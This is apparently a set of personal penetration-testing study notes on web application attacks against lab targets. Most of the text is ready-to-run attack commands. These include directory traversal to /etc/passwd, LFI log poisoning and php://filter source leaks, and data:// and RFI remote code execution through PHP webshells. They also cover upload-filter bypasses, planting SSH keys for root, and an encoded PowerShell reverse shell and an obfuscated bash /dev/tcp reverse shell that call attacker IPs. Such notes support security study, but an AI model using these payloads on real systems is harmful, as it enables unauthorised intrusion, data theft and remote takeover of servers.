- Files hosted on linux are likely hosted at `/var/www/html`
- Hover over links to find links, souirce code etc
- Getting around firewalls blocking ../.. `curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`

```
feroxbuster --url http://192.168.241.153:8000/partner --depth 2 
```
#### LFI
- Similar to directory traversal, but can execute local or remote code
- Fore example, this would write ps to the log:
`curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps`
- If running on windows, likely under C:\xampp\apache\logs

#### PHP Wrappers
- Applying filter `php://filter` will allow the viewing of source code
- `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`
- `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
	- Decode with `echo "<string>" | base64 -d`
- `http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php`

- **data://** can achieve RCE
	- `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
	- Firewalls often block these elements so base64 encode them
	- `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
	- `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`

#### RFI
- `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls`
- Can point at a reverse shell to execute, or just a webshell

#### File Upload Vulnerabilities
- Can attempt to bypass .php filter with `.phps, .php7, .pHP, .PhP, PHp` etc
- You can pass a php webshell an encoded powershell one-liner
```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

#### Non-Executable Uploaded Files
- Try to upload your authorized_keys files to `../../../../../../../root/.ssh/authorized_keys`

#### OS Command Injection
```
; for PS and bash, & for cmd
- [(dir 2>&1 *\`|echo CMD);&<# rem #>echo PowerShell] 
	- This can be used to determine whether PS or CMD is used as a windows shell
```

### Bypass Redirects
https://vk9-sec.com/bypass-30x-redirect-with-burpsuite/

**Log Poisoning Example**
![[Pasted image 20240504135215.png]]

**Web Command?**
```
try +id
;id
`id
etc

Then try double URL encoding this

echo "echo $(echo 'bash -i >& /dev/tcp/192.168.49.79/80 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
```

**strcmp**
```
if strcmp is in source code for login, try:
username=admin&password[]=="" in post request
```

**Only JPGs?**
```
Download
steghide --extract -sf <filename>
```

**Base 64 Linux Rev Shell Command**
```
<web command/varaible input> | echo "base64 verison of 'rm /tmp/f shell etc'" | base64 -d | sh
```